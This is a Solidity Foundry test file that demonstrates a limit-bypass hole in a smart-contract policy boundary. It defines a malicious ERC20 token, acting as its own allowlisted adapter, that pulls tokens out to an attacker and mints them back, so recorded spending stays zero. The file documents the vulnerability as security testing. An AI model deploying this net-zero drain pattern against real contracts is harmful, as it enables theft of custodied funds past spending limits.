// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {AkmenaCore} from "../src/core/AkmenaCore.sol";
import {AkmenaPolicyBoundary} from "../src/authorization/AkmenaPolicyBoundary.sol";
import {AkmenaExecutionAuthorization} from "../src/authorization/AkmenaExecutionAuthorization.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice Malicious token that is ALSO its own allowlisted economic adapter
/// (setEconomicAdapter has no adapter != asset guard). Its adapter entrypoint
/// moves `amt` out of the boundary's balance to an attacker, then mints
/// `amt` back to the boundary. Net balance delta is ZERO while `amt` of
/// real value leaves custody.
contract NetZeroToken is ERC20 {
    constructor() ERC20("NetZero", "NZ") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }

    /// @dev Invoked by the boundary via executeAuthorizedAgentCall, so
    /// msg.sender == boundary. Pull `amt` out, mint `amt` back: net zero.
    function executeNetZero(address to, uint256 amt) external {
        _transfer(msg.sender, to, amt);
        _mint(msg.sender, amt);
    }
}

/// @notice SCRATCH investigation (not a permanent regression test):
/// demonstrates the net-zero gross-outflow hole in net-delta accounting.
/// The bdc65f90 EconomicBalanceIncrease guard only reverts on a net
/// balance INCREASE (balanceAfter > balanceBefore). A pull-100/mint-100
/// flow nets to exactly zero, so spent = 0 is recorded and per-transaction
/// + daily limits are bypassed entirely.
contract Scratch_GrossOutflowNetZero is Test {
    AkmenaCore internal core;
    AkmenaPolicyBoundary internal boundary;
    AkmenaExecutionAuthorization internal auth;
    NetZeroToken internal token;

    address internal attacker = address(0xBAD);

    uint256 internal constant AGENT_KEY = 0xA11CE;
    address internal agent;

    uint256 internal nonceCounter;

    function setUp() public {
        agent = vm.addr(AGENT_KEY);

        core = new AkmenaCore(); // test contract IS core.deployer()
        boundary = new AkmenaPolicyBoundary(address(core));
        auth = boundary.executionAuthorization();

        token = new NetZeroToken();

        // maxSpendPerTransaction = 100, dailyLimit = 50, no escrow.
        boundary.setAgentAssetPolicy(agent, address(token), 100 ether, 50 ether, false);
        // Token allowlisted as its own adapter: the dangerous configuration
        // setEconomicAdapter() permits (no adapter != asset check).
        boundary.setEconomicAdapter(address(token), address(token), true);

        token.mint(address(boundary), 1000 ether);
    }

    function _intent(address target, bytes memory payload, address asset, uint256 amount)
        internal
        returns (AkmenaExecutionAuthorization.ExecutionIntent memory intent)
    {
        intent = AkmenaExecutionAuthorization.ExecutionIntent({
            operator: address(this),
            agent: agent,
            target: target,
            selector: bytes4(payload),
            calldataHash: keccak256(payload),
            asset: asset,
            amount: amount,
            value: 0,
            proofModuleKey: bytes32(0),
            proofId: 0,
            nonce: ++nonceCounter,
            validAfter: 0,
            deadline: block.timestamp + 1 days
        });
    }

    function _sign(AkmenaExecutionAuthorization.ExecutionIntent memory intent)
        internal
        view
        returns (bytes memory sig)
    {
        bytes32 digest = auth.hashIntent(intent);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AGENT_KEY, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _totalSpent(address asset) internal view returns (uint256) {
        (,, uint256 totalSpentToday,,) = boundary.agentAssetPolicies(address(this), agent, asset);
        return totalSpentToday;
    }

    function _extract100() internal {
        bytes memory payload =
            abi.encodeWithSelector(NetZeroToken.executeNetZero.selector, attacker, 100 ether);
        AkmenaExecutionAuthorization.ExecutionIntent memory intent =
            _intent(address(token), payload, address(token), 0);
        bytes memory sig = _sign(intent); // sign BEFORE any expectRevert

        vm.prank(agent);
        boundary.executeAuthorizedAgentCall(intent, payload, sig);
    }

    /// @notice The attack: three extractions of 100 tokens each, under a
    /// DAILY LIMIT OF 50. Net delta is zero every time, so spent = 0 is
    /// recorded and neither the per-transaction cap nor the daily limit
    /// ever trips. Must SUCCEED (demonstrating the hole), with the
    /// attacker 300 richer and accounting untouched.
    function test_netZeroBypassesAllLimits() public {
        _extract100();
        _extract100();
        _extract100();

        assertEq(token.balanceOf(attacker), 300 ether, "attacker extracted 300 across 3 calls");
        assertEq(token.balanceOf(address(boundary)), 1000 ether, "boundary net balance unchanged");
        assertEq(
            _totalSpent(address(token)),
            0,
            "HOLE: recorded spend is 0 after 300 extracted under a 50 daily limit"
        );
    }
}
